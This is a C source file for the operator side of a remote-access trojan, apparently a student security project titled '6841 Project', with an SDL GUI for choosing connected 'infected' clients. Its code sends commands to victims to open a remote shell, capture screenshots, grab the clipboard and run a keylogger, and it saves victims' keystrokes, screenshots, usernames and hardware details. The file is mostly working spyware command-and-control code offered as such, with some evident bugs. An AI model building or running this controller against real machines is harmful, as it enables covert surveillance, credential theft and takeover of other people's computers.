#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <lmcons.h>
#include <SDL.h>
#include <SDL_ttf.h>

#include "render.h"
#include "server.h"

// Main thread for running the client
void client_thread(const client_t* client) {

    int setupChecker = TRUE;
    const int clientId = client->id;
    const SOCKET clientSocket = client->client;

    const long int threadID = clientId;

    while (1) {

        if (threadID == clientId) {
            char functionRunBytes[1024];

            char functionReturn[1024];
            ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
            // Gain client data
            if (setupChecker) {
                // Gain CPU information
                char cpuData[MAX_MEMORY_SIZE];

                ZeroMemory(cpuData, sizeof(cpuData));
                recv(clientSocket, cpuData, sizeof(cpuData), 0);
                printf("%llu <-- memory details\n", sizeof(cpuData));
                sprintf(cpuDetails,"%s\n", cpuData);

                // Gain Clients memory information
                char memoryData[MAX_MEMORY_SIZE];

                ZeroMemory(memoryData, sizeof(memoryData));
                recv(clientSocket, memoryData, sizeof(memoryData), 0);
                printf("%llu <-- memory details\n", sizeof(memoryData));
                sprintf(memoryDetails, "%s\n", memoryData);

                // Gain users information
                char userData[UNLEN + 1];
                ZeroMemory(userData, sizeof(userData));
                recv(clientSocket, userData, sizeof(userData), 0);
                printf("%llu <-- memory details\n", sizeof(userData));
                sprintf(userDetails, "%s\n", userData);

                // We have now got all required information from the client, no need to do this again.
                setupChecker = FALSE;
            // Run the keylogger
            } if (keyloggingChecker) {
                printf("keyloggingChecker\n");
                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
                sprintf(functionRunBytes,"kl");
                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
                keyloggingFunction = TRUE;
                keyloggingChecker = FALSE;
                printf("Keylogging started\n");
                CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogging, clientSocket, 0, 0);
            // End the keylogger
            } else if (killKeyLogging) {
                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
                printf("Keylogging Stopped\n");
                sprintf(functionRunBytes,"ks");
                killKeyLogging = FALSE;
                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);
            // Take a screenshot
            } else if (screenshotFunction) {
                screenshotFunction = FALSE;
                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
                sprintf(functionRunBytes, "ss");
                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);

                char imageLengthBuffer[1024];
                recv(clientSocket, imageLengthBuffer, sizeof(imageLengthBuffer), 0);
                const long imgLen = atol(imageLengthBuffer);
                printf("\nSize of image : %ld\n", imgLen);

                BYTE* img = malloc(sizeof(BYTE) * imgLen);

                long bytesRecieved = 0;
                // Get indivdual image bytes, sometimes this is super slow sometimes this is instant
                while(bytesRecieved < imgLen) {
                    bytesRecieved += (long)recv(clientSocket, (char*)(img + bytesRecieved), imgLen - bytesRecieved, 0);
                }

                char filename[128];
                ZeroMemory(filename, sizeof(filename));
                sprintf(filename, "Screenshot %d.bmp", clientId);

                printf("%llu\n", sizeof(filename));
                FILE *image = fopen(filename, "wb+");
                fwrite(img, sizeof(BYTE), imgLen, image);
                fclose(image);

                printf("Image done processing\n");

                free(img);
            } else if (shellChecker) {

                shellChecker = FALSE;

                shellFunction = TRUE;
                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));
                ZeroMemory(functionReturn, sizeof(functionReturn));

                shell(clientSocket);

            } else if (copyClipBoard) {

                ZeroMemory(functionRunBytes, sizeof(functionRunBytes));

                sprintf(functionRunBytes,"cc");
                copyClipBoard = FALSE;
                send(clientSocket, functionRunBytes, sizeof(functionRunBytes), 0);

                ZeroMemory(functionReturn, sizeof(functionReturn));
                recv(clientSocket, functionReturn, sizeof(functionReturn), 0);

                printf("%s\n", functionReturn);
            }
        }
    }

}

// Create a shell interface for the infected device, requires a restart to undo
void shell(SOCKET clientSocket) {

    // char* shellBytes = malloc(128 * sizeof(char*));
    char shellBytes[25000];
    printf("%llu\n", sizeof(shellBytes));
    char* shellReturn[25000];

    FreeConsole();
    if (!AllocConsole()) {
        printf("Failed to allocate console: %d\n", GetLastError());
        shellChecker = FALSE;

        free(shellBytes);
        free(shellReturn);

        return;
    }

    if (!freopen("CONIN$", "r", stdin)) {
        printf("Failed to connin: \n");
        shellChecker = FALSE;

        free(shellBytes);
        free(shellReturn);

        return;
    }

    if (!freopen("CONOUT$", "w", stdout)) {
        printf("Failed to conout: \n");
        shellChecker = FALSE;

        free(shellBytes);
        free(shellReturn);

        return;
    }

    HANDLE outHandle = GetStdHandle(STD_OUTPUT_HANDLE);

    if (outHandle == INVALID_HANDLE_VALUE) {
        printf("GetStdHandle failed with error: %d\n", GetLastError());

        free(shellBytes);
        free(shellReturn);

        return; // Handle error appropriately
    }

    SetConsoleTextAttribute(outHandle, FOREGROUND_BLUE);

    printf("Type q to quit shell\n");
    SetConsoleTextAttribute(outHandle, FOREGROUND_RED);

    while (shellFunction) {
        ZeroMemory(shellBytes, sizeof(shellBytes));
        ZeroMemory(shellReturn, sizeof(shellReturn));

        printf("shell: ");
        fgets(shellBytes, sizeof(shellBytes), stdin);

        strtok(shellBytes, "\n");

        if (send(clientSocket, shellBytes, sizeof(shellBytes), 0) == SOCKET_ERROR) {
            printf("Client has Disconnected.\n");
            ExitThread(0);
        }

        printf("%s\n", shellBytes);

        if (!strcmp(shellBytes, "q")) {
            FreeConsole();
            shellFunction = FALSE;
            shellChecker = FALSE;

            sprintf(shellBytes, "restart");
            send(clientSocket, shellBytes, sizeof(shellBytes), 0);

            CloseHandle(outHandle);
            ExitThread(0);
        }

        recv(clientSocket, shellReturn, sizeof(shellReturn), MSG_WAITALL);
        printf("%s\n", shellReturn);

        Sleep(500);

    }

    free(shellBytes);
    free(shellReturn);

}

// Logs all keystrokes and mouse strokes
void keylogging(const SOCKET clientSock) {
    FILE* keylogging_file = fopen("keylogging.txt", "w");

    char recvBuffer[1024];

    while (keyloggingFunction) {
        ZeroMemory(recvBuffer, sizeof(recvBuffer));

        const int result = recv(clientSock, recvBuffer, sizeof(recvBuffer), 0);

        if (result <= 0) break;
        printf("%s\n", recvBuffer);
        fprintf(keylogging_file, "%s\n", recvBuffer);
    }

    fclose(keylogging_file);
    ExitThread(0);

}

// Recursive function to find the final client in the list
__stdcall client_t* last_client(client_t* client) {
    if (client->next == NULL) {
        return client;
    }

    return last_client(client->next);
}

// Get a given client from number
__stdcall void grab_client(const client_t* client, const long int id) {

    if (id > upToId) return;

    static long int counter = 0;

    if (counter == id) {
        counter = 0;
        CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)client_thread, client, 0, 0));
    } else if (counter > id) {
    } else {
        counter++;
        grab_client(client->next, id);
    }
}

// Update clients with correct info
void update_client(client_t* clients) {
    while (serverRunning) {
        for (int x = 0; x < sizeof(num_keys) / sizeof(num_keys[0]); x++) {
            if (GetKeyState(num_keys[x]) & 0x1000) {
                char output[1337] = "";
                ZeroMemory(output, sizeof(output));
                if (num_keys[x] == 0x0D) {
                    char* end;
                    printf("\nClient ID: %d\n", clients->id);
                    clients->id = strtol(output, &end, 10);
                    printf("\nStrtol: %d", clients->id);
                    sprintf(clientNumBuffer, "Click to Choose Client: ");

                    sprintf(userDetails, "Username: ");
                    sprintf(cpuDetails, "CPU: ");
                    sprintf(memoryDetails, "Memory: ");

                    grab_client(clients, clients->id);

                    return;
                }

                char temp[2];
                sprintf(temp, "%d", x);

                strcat(output, temp);
                sprintf(clientNumBuffer, "%s", output);
                Sleep(500);
            }
        }
    }
}


// Add a client to the linked list.
__stdcall void add_client(client_t* clients) {

    if (clients->id == -1) {
        clients->next = NULL;
        // Listen on the socket, somaxconn is the max number of potential connections
        listen(sock, SOMAXCONN);

        int addressLength = sizeof(clients->next->clientAddress);

        clients->client = accept(sock, &clients->clientAddress, &addressLength);
        clients->id = upToId++;

        // If the socket was invalid, remove the bad connection from the list to ensure that nothing goes wrong later
        if (clients->client == INVALID_SOCKET) {
            printf("Bad connection\n");
            free(clients->next);
            return;
        }

        printf("New client added. %d %d\n", clients->id, clients->id);

        return;
    }

    if (clients->next == NULL) {
        clients->next = (client_t*)malloc(sizeof(client_t));
        clients->next->next = NULL;
        // Listen on the socket, somaxconn is the max number of potential connections
        listen(sock, SOMAXCONN);

        int addressLength = sizeof(clients->next->clientAddress);

        clients->next->client = accept(sock, &clients->next->clientAddress, &addressLength);
        clients->next->id = upToId++;

        // If the socket was invalid, remove the bad connection from the list to ensure that nothing goes wrong later
        if (clients->next->client == INVALID_SOCKET) {
            printf("Bad connection\n");
            free(clients->next);
            return;
        }

        printf("New client added. %d %d\n", clients->id, clients->next->id);
    } else {
        add_client(clients->next);
    }

}

// Thread to add new clients
void add_clients_runner(client_t* clients) {

    while (serverRunning) {
        printf("Trying to add a client\n");
        add_client(clients);
        Sleep(100000);
    }

}

int text_width(const char* text) {

    const int textSize[2] = {get_text_size(text)[0], get_text_size(text)[1]};
    return textSize[0];

}

int text_height(const char* text) {
    const int textSize[2] = {get_text_size(text)[0], get_text_size(text)[1]};
    return textSize[1];

}

int uint8_slider(mu_Context* context, unsigned char* value, const int low, const int high) {
    static float temp;
    mu_push_id(context, &value, sizeof(value));
    temp = *value;
    const int res = mu_slider_ex(context, &temp, low, high, 0, "%.0f", MU_OPT_ALIGNCENTER);
    *value = temp;
    mu_pop_id(context);
    return res;
}

// Design main window, I LOVE GUI PROGRAMMING :((((((((
void window(mu_Context* context, client_t* clients) {

    unsigned int panelID = 0;
    int menuTabClick[] = { 0, 0, 0 };
    static int menuTab = 0;

    if (mu_begin_window(context, "6841 Project", mu_rect(0, 0, 775, 450))) {
        mu_Container* window = mu_get_current_container(context);
        window->rect.w = mu_max(window->rect.w, 750);
        window->rect.h = mu_max(window->rect.h, 365);

        // Main outline rectangle
        mu_Rect outlineRect = mu_rect(10, 25, 375, 400);
        mu_draw_control_frame(context, (mu_Id)&panelID, outlineRect, MU_COLOR_BASE, 0);

        // Options outline
        mu_Rect tabOutline = mu_rect(20, 50, 100, 100);
        mu_draw_control_frame(context, (mu_Id)&panelID, tabOutline, MU_COLOR_BASE, 0);

        mu_layout_set_next(context, mu_rect(50, 75, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Main", 0, 0, menuTabClick[0])) {
            menuTabClick[0] = 1;
            menuTabClick[1] = 0;
            menuTabClick[2] = 0;
            menuTab = 0;
        }
    }
        mu_layout_set_next(context, mu_rect(40, 90, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Settings", 0, 0, menuTabClick[1])) {
            menuTabClick[0] = 0;
            menuTabClick[1] = 1;
            menuTabClick[2] = 0;
            menuTab = 1;
        }
        mu_layout_set_next(context, mu_rect(52, 105, 100, 20), 0);
        if (mu_clickable_text_ex(context, "Exit", 0, 0, menuTabClick[2])) {
            kill();
        }

        // Menu tab 0 is the Main tab
        if (menuTab == 0) {
            mu_layout_set_next(context, mu_rect(125, 30, 260, 20), 0);
            if (mu_header_ex(context, "======== Pick Client ========", MU_OPT_EXPANDED, 175)) {
                mu_layout_set_next(context, mu_rect(125, 60, 260, 20), 0);
                if (mu_button(context, clientNumBuffer)) {
                    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)update_client, clients, 0, 0);
                }
                mu_layout_set_next(context, mu_rect(125, 90, 15, 15), 0);
                mu_Rect clientPickerInfoRect1 = mu_layout_next(context);
                mu_draw_control_text(context, "Click then type a client number", clientPickerInfoRect1, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 105, 15, 15), 0);
                mu_Rect clientPickerInfoRect2 = mu_layout_next(context);
                mu_draw_control_text(context, "Then press enter to finish!", clientPickerInfoRect2, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 120, 15, 15), 0);
                mu_Rect clientPickerInfoRect3 = mu_layout_next(context);
                mu_draw_control_text(context, "Changing client resets the currently", clientPickerInfoRect3, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 135, 15, 15), 0);
                mu_Rect clientPickerInfoRect4 = mu_layout_next(context);
                mu_draw_control_text(context, "selected client.", clientPickerInfoRect4, MU_COLOR_TEXT, 0);
                mu_layout_set_next(context, mu_rect(125, 150, 15, 15), 0);
                mu_Rect clientPickerInfoRect5 = mu_layout_next(context);
                mu_draw_control_text(context, "This client will be set to last client", clientPickerInfoRect5, MU_COLOR_TEXT, 0);

                char clientNumBuf[1347];
                sprintf(clientNumBuf, "Selected Client: %ld", clients->id);
                mu_layout_set_next(context, mu_rect(125, 165, 15, 15), 0);
                mu_Rect clientNumRect = mu_layout_next(context);
                mu_draw_control_text(context, clientNumBuf, clientNumRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 180, 15, 15), 0);
                mu_Rect userDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, userDetails, userDetailsRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 195, 15, 15), 0);
                mu_Rect cpuDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, cpuDetails, cpuDetailsRect, MU_COLOR_TEXT, 0);

                mu_layout_set_next(context, mu_rect(125, 210, 15, 15), 0);
                mu_Rect memoryDetailsRect = mu_layout_next(context);
                mu_draw_control_text(context, memoryDetails, memoryDetailsRect, MU_COLOR_TEXT, 0);
            }
            mu_layout_set_next(context, mu_rect(125, 223, 260, 20), 0);

            if (mu_header_ex(context, "        ======= Functions: ========", MU_OPT_EXPANDED, 134)) {
                mu_layout_set_next(context, mu_rect(125, 241, 260, 15), 0);
                if (mu_button(context, "Start a shell on a chosen client!")) {
                    shellChecker = TRUE;
                }

                mu_layout_set_next(context, mu_rect(125, 257, 260, 15), 0);
                if (mu_button(context, "Take a screenshot of a client!")) {
                    screenshotFunction = TRUE;
                }

                char commandBytesBuffer[1024] = "";
                mu_layout_set_next(context, mu_rect(125, 273, 260, 15), 0);
                if (mu_textbox(context, commandBytesBuffer, sizeof(commandBytesBuffer)) &MU_RES_SUBMIT) {
                    mu_set_focus(context, context->last_id);
                }

                mu_layout_set_next(context, mu_rect(125, 273, 260, 15), 0);
                if (mu_button(context, "Copy current clipboard!      ")) {
                    copyClipBoard = TRUE;
                }

                mu_layout_set_next(context, mu_rect(125, 293, 260, 15), 0);
                if (mu_button(context, "Begin keylogging!")) {
                    keyloggingChecker = TRUE;
                    printf("%d function\n", keyloggingFunction);
                    printf("%d checker\n", keyloggingChecker);
                }

                mu_layout_set_next(context, mu_rect(125, 313, 260, 15), 0);
                if (mu_button(context, "End keylogging!")) {
                    keyloggingChecker = FALSE;
                    keyloggingFunction = FALSE;
                    killKeyLogging = TRUE;
                    printf("%d\n", keyloggingFunction);
                }
            }
        } else if (menuTab == 1) {
            mu_layout_set_next(context, mu_rect(125, 30, 220, 20), 0);
            if (mu_header_ex(context, "                        Colour", MU_OPT_EXPANDED, 100)) {
                mu_layout_set_next(context, mu_rect(185, 60, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].r, 0, 255);

                mu_layout_set_next(context, mu_rect(185, 80, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].g, 0, 255);

                mu_layout_set_next(context, mu_rect(185, 100, 100, 15), 0);
                uint8_slider(context, &context->style->colors[1].b, 0, 255);
            }
        }

    mu_end_window(context);
}

// Create the actual window, then send it above for design and stuff
void create_window(client_t* clients) {

    SDL_Init(SDL_INIT_EVERYTHING);
    TTF_Init();
    init(400, 450);

    printf("%lld", sizeof(mu_Context));

    mu_Context* context = malloc(sizeof(mu_Context));
    mu_init(context);

    const float backgroundColours[3] = { 0, 255, 255 };

    context->text_width = text_width;
    context->text_height = text_height;

    while (serverRunning) {
        SDL_Event event;
        while (SDL_PollEvent(&event)) {

            switch (event.type) {
                case SDL_QUIT:
                    free(context);
                    kill();
                    break;
                case SDL_MOUSEMOTION:
                    mu_input_mousemove(context, event.motion.x, event.motion.y);
                    break;
                case SDL_MOUSEWHEEL:
                    mu_input_scroll(context, 0, event.wheel.y * -30);
                    break;
                case SDL_TEXTINPUT:
                    mu_input_text(context, event.text.text);
                    break;

                case SDL_MOUSEBUTTONDOWN:
                case SDL_MOUSEBUTTONUP:
                    const int b = buttonMap[event.button.button & 0xff];
                    if (b && event.type == SDL_MOUSEBUTTONDOWN) {
                        mu_input_mousedown(context, event.button.x, event.button.y, b);
                    } else {
                        mu_input_mouseup(context, event.button.x, event.button.y, b);
                    }
                    break;
                case SDL_KEYDOWN:
                case SDL_KEYUP:
                    const int k = keyMap[event.key.keysym.sym & 0xff];
                    if (k && event.type == SDL_KEYDOWN) {
                        mu_input_keydown(context, k);
                    } else {
                        mu_input_keyup(context, k);
                    }
                default:
                    break;
            }
        }

        mu_begin(context);
        window(context, clients);
        mu_end(context);

        clear(mu_color(backgroundColours[0], backgroundColours[1], backgroundColours[2],255));

        mu_Command* command = NULL;

        while (mu_next_command(context, &command)) {
            switch (command->type) {
                case MU_COMMAND_TEXT:
                    draw_text(command->text.str, command->text.pos, command->text.color);
                break;
                case MU_COMMAND_RECT:
                    draw_rect(command->rect.rect, command->rect.color);
                break;
                case MU_COMMAND_ICON:
                    draw_icons(command->icon.id, command->icon.rect);
                break;
                default:
                    break;
            }
        }

        present();

        Sleep(100);

    }

    clean();
    SDL_Quit();
    TTF_Quit();
    kill();

}

void kill(client_t* clients) {
    serverRunning = FALSE;
    free_client_list(clients);
    exit(EXIT_SUCCESS);
}

// Pls no memory leaks :pray:
void free_client_list(client_t* client) {
    if (client->next == NULL) return;

    client_t* next = client->next;
    free(client);

    return free(next);
}

// Setup server then run client runner and main window
int main(int argc, char *argv[]) {

    WSADATA wsaData;

    ZeroMemory(&wsaData, sizeof(wsaData));
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    struct addrinfo* ainfo;
    ZeroMemory(&ainfo, sizeof(ainfo));

    #define SUCCESS 0
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != SUCCESS) {

        printf("Could not setup winsock2\n");
        Sleep(1000);
        return 1;

    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (getaddrinfo("localhost", "50005", &hints, &ainfo) != SUCCESS) {

        printf("Could not get address info\n");
        Sleep(1000);
        WSACleanup();
        return 1;
    }

    sock = socket(ainfo->ai_family, ainfo->ai_socktype, ainfo->ai_protocol);
    if (sock == INVALID_SOCKET) {

        printf("Could not create socket\n");
        Sleep(1000);
        freeaddrinfo(ainfo);
        WSACleanup();
    }

    if (bind(sock, ainfo->ai_addr, ainfo->ai_addrlen) != SUCCESS) {

        printf("Could not bind socket\n");
        Sleep(1000);
        freeaddrinfo(ainfo);
        closesocket(sock);
        WSACleanup();
        return 1;

    }

    serverRunning = TRUE;

    freeaddrinfo(ainfo);

    client_t* clients = malloc(sizeof(client_t));
    clients->id = -1;
    clients->next = NULL;

    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)add_clients_runner, clients, 0, 0);

    create_window(clients);

    Sleep(100000);

    closesocket(sock);
    WSACleanup();

    return 0;

}

